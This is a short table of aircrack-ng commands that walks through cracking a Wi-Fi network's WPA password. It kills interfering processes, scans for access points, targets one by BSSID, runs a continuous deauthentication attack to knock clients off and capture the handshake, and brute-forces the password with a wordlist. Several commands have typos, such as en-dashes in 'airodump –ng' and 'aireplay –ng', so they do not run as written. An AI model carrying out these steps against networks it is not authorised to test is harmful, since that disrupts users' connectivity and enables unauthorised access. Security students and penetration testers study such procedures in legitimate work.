| S.No |  Command             | Description                |
|------|----------------------------|----------------------------|
| 1.   | `airmon-ng check <your-wireless-network interface> `     | Checks for any running processes that could cause trouble in capturing 4-way handshake.           |
| 2.   | `airmon-ng check kill <your-wireless-network-interface>`  | Kills processes that cause trouble in capturing 4-way handshake.     |
| 3.   | `airodump –ng <your-wireless-network-interface>` | Starts listening to wireless networks around you |
| 4.   | `airodump –ng –c <channel-number-on-which-wireless-access-point-is-running>  --bssid <MAC address of WAP> <your-wireless-network-interface>`       | Returns list of MAC addresses that are connected to entered WAP.     |
| 5.   | `aireplay –ng -0 0 –a <MAC address> <your-wireless-network-interface>`     | Starts the de-authentication attack |
| 6.   | `wireshark <.cap file>`     | Opens .cap file in wireshark to explore packets that flowed during de-authentication attack. |
| 7.   | `aircrack-ng -w <path till word-list containing passwords> <.cap file>`     | Starts brue-force attack on WAP to capture encrypted password. |
